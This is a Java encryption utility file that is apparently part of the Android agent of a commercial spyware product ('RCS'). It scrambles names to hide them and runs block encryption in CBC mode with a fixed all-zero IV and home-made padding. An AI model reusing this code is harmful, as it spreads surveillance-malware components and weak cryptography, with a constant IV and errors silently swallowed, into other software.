/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : Encryption.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.crypto;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.zip.CRC32;

import javax.crypto.NoSuchPaddingException;

import com.android.service.auto.Cfg;
import com.android.service.util.Check;
import com.android.service.util.Utils;

// TODO: Auto-generated Javadoc

/**
 * The Class Encryption.
 */
public class Encryption {

	/** The Constant TAG. */
	private static final String TAG = "Encryption";

	/**
	 * Inits the.
	 */
	public static void init() {

	}

	/**
	 * Descrambla una stringa, torna il puntatore al nome descramblato. La
	 * stringa ritornata va liberata dal chiamante con una free()!!!!
	 * 
	 * @param Name
	 *            the name
	 * @param seed
	 *            the seed
	 * @return the string
	 */
	public static String decryptName(final String Name, final int seed) {
		return scramble(Name, seed, false);
	}

	/**
	 * Scrambla una stringa, torna il puntatore al nome scramblato. La stringa
	 * ritornata va liberata dal chiamante con una free()!!!!
	 * 
	 * @param Name
	 *            the name
	 * @param seed
	 *            the seed
	 * @return the string
	 */
	public static String encryptName(final String Name, final int seed) {
		// if(AutoConfig.DEBUG) Check.log( TAG + " seed : " + seed);
		return scramble(Name, seed, true);
	}

	/**
	 * Gets the next multiple.
	 * 
	 * @param len
	 *            the len
	 * @return the next multiple
	 */
	public int getNextMultiple(final int len) {
		if (Cfg.DEBUG) {
			Check.requires(len >= 0, "len < 0");
		}
		final int newlen = len + (len % 16 == 0 ? 0 : 16 - len % 16);
		if (Cfg.DEBUG) {
			Check.ensures(newlen >= len, "newlen < len");
		}
		if (Cfg.DEBUG) {
			Check.ensures(newlen % 16 == 0, "Wrong newlen");
		}
		return newlen;
	}

	/**
	 * Questa funzione scrambla/descrambla una stringa e ritorna il puntatore
	 * alla nuova stringa. Il primo parametro e' la stringa da de/scramblare, il
	 * secondo UN byte di seed, il terzo se settato a TRUE scrambla, se settato
	 * a FALSE descrambla.
	 * 
	 * @param name
	 *            the name
	 * @param seed
	 *            the seed
	 * @param enc
	 *            the enc
	 * @return the string
	 */
	private static String scramble(final String name, int seed, final boolean enc) {
		final char[] retString = name.toCharArray();
		final int len = name.length();
		int i, j;

		final char[] alphabet = { '_', 'B', 'q', 'w', 'H', 'a', 'F', '8', 'T', 'k', 'K', 'D', 'M', 'f', 'O', 'z', 'Q',
				'A', 'S', 'x', '4', 'V', 'u', 'X', 'd', 'Z', 'i', 'b', 'U', 'I', 'e', 'y', 'l', 'J', 'W', 'h', 'j',
				'0', 'm', '5', 'o', '2', 'E', 'r', 'L', 't', '6', 'v', 'G', 'R', 'N', '9', 's', 'Y', '1', 'n', '3',
				'P', 'p', 'c', '7', 'g', '-', 'C' };

		final int alphabetLen = alphabet.length;

		if (seed < 0) {
			seed = -seed;
		}

		// Evita di lasciare i nomi originali anche se il byte e' 0
		seed = (seed > 0) ? seed %= alphabetLen : seed;

		if (seed == 0) {
			seed = 1;
		}
		if (Cfg.DEBUG) {
			Check.asserts(seed > 0, "negative seed");
		}
		for (i = 0; i < len; i++) {
			for (j = 0; j < alphabetLen; j++) {
				if (retString[i] == alphabet[j]) {
					// Se crypt e' TRUE cifra, altrimenti decifra
					if (enc) {
						retString[i] = alphabet[(j + seed) % alphabetLen];
					} else {
						retString[i] = alphabet[(j + alphabetLen - seed) % alphabetLen];
					}

					break;
				}
			}
		}

		return new String(retString);
	}

	/** The crypto. */
	Crypto crypto;

	/**
	 * Instantiates a new encryption.
	 * 
	 * @param key
	 *            the key
	 */
	public Encryption(final byte[] key) {
		makeKey(key);
	}

	/**
	 * Make key.
	 * 
	 * @param key
	 *            the key
	 */
	public void makeKey(final byte[] key) {
		try {
			crypto = new Crypto(key);
		} catch (final NoSuchAlgorithmException e) {

			if (Cfg.DEBUG) {
				Check.log(e);
			}
		} catch (final NoSuchPaddingException e) {

			if (Cfg.DEBUG) {
				Check.log(e);
			}
		}
	}

	/**
	 * Decrypt data.
	 * 
	 * @param cyphered
	 *            the cyphered
	 * @return the byte[]
	 * @throws CryptoException
	 *             the crypto exception
	 */
	public byte[] decryptData(final byte[] cyphered) throws CryptoException {
		return decryptData(cyphered, cyphered.length, 0);
	}

	/**
	 * Decrypt data.
	 * 
	 * @param cyphered
	 *            the cyphered
	 * @param offset
	 *            the offset
	 * @return the byte[]
	 * @throws CryptoException
	 *             the crypto exception
	 */
	public byte[] decryptData(final byte[] cyphered, final int offset) throws CryptoException {
		return decryptData(cyphered, cyphered.length - offset, offset);
	}

	/**
	 * Decrypt data, CBC mode.
	 * 
	 * @param cyphered
	 *            the cyphered
	 * @param plainlen
	 *            the plainlen
	 * @param offset
	 *            the offset
	 * @return the byte[]
	 * @throws CryptoException
	 *             the crypto exception
	 */
	public byte[] decryptData(final byte[] cyphered, final int plainlen, final int offset) throws CryptoException {
		final int enclen = cyphered.length - offset;
		if (Cfg.DEBUG) {
			Check.requires(enclen % 16 == 0, "Wrong padding");
		}
		if (Cfg.DEBUG) {
			Check.requires(enclen >= plainlen, "Wrong plainlen");
		}
		final byte[] plain = new byte[plainlen];
		byte[] iv = new byte[16];

		final byte[] pt = new byte[16];

		final int numblock = enclen / 16;
		final int lastBlockLen = plainlen % 16;
		for (int i = 0; i < numblock; i++) {
			final byte[] ct = Utils.copy(cyphered, i * 16 + offset, 16);

			crypto.decrypt(ct, pt);
			xor(pt, iv);
			iv = Utils.copy(ct);

			if ((i + 1 >= numblock) && (lastBlockLen != 0)) { // last turn
				// and remaind
				if (Cfg.DEBUG) {
					Check.log(TAG + " lastBlockLen: " + lastBlockLen);
				}
				System.arraycopy(pt, 0, plain, i * 16, lastBlockLen);
			} else {
				System.arraycopy(pt, 0, plain, i * 16, 16);
				// copyblock(plain, i, pt, 0);
			}
		}
		if (Cfg.DEBUG) {
			Check.ensures(plain.length == plainlen, "wrong plainlen");
		}
		return plain;
	}

	/**
	 * Encrypt data.
	 * 
	 * @param plain
	 *            the plain
	 * @return the byte[]
	 */
	public byte[] encryptData(final byte[] plain) {
		return encryptData(plain, 0);
	}

	/**
	 * Encrypt data in CBC mode and HT padding.
	 * 
	 * @param plain
	 *            the plain
	 * @param offset
	 *            the offset
	 * @return the byte[]
	 */
	public byte[] encryptData(final byte[] plain, final int offset) {

		final int len = plain.length - offset;

		// TODO: optimize, non creare padplain, considerare caso particolare
		// ultimo blocco
		final byte[] padplain = pad(plain, offset, len);
		final int clen = padplain.length;

		if (Cfg.DEBUG) {
			Check.asserts(clen % 16 == 0, "Wrong padding");
		}
		final byte[] crypted = new byte[clen];

		byte[] iv = new byte[16]; // iv e' sempre 0
		byte[] ct;

		final int numblock = clen / 16;
		for (int i = 0; i < numblock; i++) {
			final byte[] pt = Utils.copy(padplain, i * 16, 16);
			xor(pt, iv);

			try {
				ct = crypto.encrypt(pt);
				if (Cfg.DEBUG) {
					Check.asserts(ct.length == 16, "Wrong size");
				}

				System.arraycopy(ct, 0, crypted, i * 16, 16);
				iv = Utils.copy(ct);
			} catch (final Exception e) {
				// TODO Auto-generated catch block
				if (Cfg.DEBUG) {
					Check.log(e);
				}
			}

		}

		return crypted;
	}

	/**
	 * Calcola il SHA1 del messaggio, usando la crypto api.
	 * 
	 * @param message
	 *            the message
	 * @param offset
	 *            the offset
	 * @param length
	 *            the length
	 * @return the byte[]
	 */
	public static byte[] SHA1(final byte[] message, final int offset, final int length) {
		MessageDigest digest;
		try {
			digest = MessageDigest.getInstance("SHA-1");
			digest.update(message, offset, length);
			final byte[] sha1 = digest.digest();

			return sha1;
		} catch (final NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			if (Cfg.DEBUG) {
				Check.log(e);
			}
		}
		return null;
	}

	/**
	 * SH a1.
	 * 
	 * @param message
	 *            the message
	 * @return the byte[]
	 */
	public static byte[] SHA1(final byte[] message) {
		return SHA1(message, 0, message.length);
	}

	/**
	 * Standard crc
	 * 
	 * @param packet
	 * @return
	 */
	public static long CRC32(byte[] packet) {
		final CRC32 crc = new CRC32();
		crc.reset();
		crc.update(packet);
		return crc.getValue();
	}

	/**
	 * Old style Pad, PKCS5 is available in EncryptionPKCS5.
	 * 
	 * @param plain
	 *            the plain
	 * @param offset
	 *            the offset
	 * @param len
	 *            the len
	 * @return the byte[]
	 */
	protected byte[] pad(final byte[] plain, final int offset, final int len) {
		return pad(plain, offset, len, false);
	}

	/**
	 * Pad.
	 * 
	 * @param plain
	 *            the plain
	 * @param offset
	 *            the offset
	 * @param len
	 *            the len
	 * @param PKCS5
	 *            the pKC s5
	 * @return the byte[]
	 */
	protected byte[] pad(final byte[] plain, final int offset, final int len, final boolean PKCS5) {
		final int clen = getNextMultiple(len);
		if (clen > 0) {
			final byte[] padplain = new byte[clen];
			if (PKCS5) {
				final int value = clen - len;
				for (int i = 1; i <= value; i++) {
					padplain[clen - i] = (byte) value;
				}
			}
			System.arraycopy(plain, offset, padplain, 0, len);
			return padplain;
		} else {
			return plain;
		}
	}

	/**
	 * Xor.
	 * 
	 * @param pt
	 *            the pt
	 * @param iv
	 *            the iv
	 */
	void xor(final byte[] pt, final byte[] iv) {
		if (Cfg.DEBUG) {
			Check.requires(pt.length == 16, "pt not 16 bytes long");
		}
		if (Cfg.DEBUG) {
			Check.requires(iv.length == 16, "iv not 16 bytes long");
		}
		for (int i = 0; i < 16; i++) {
			pt[i] ^= iv[i];
		}
	}

}
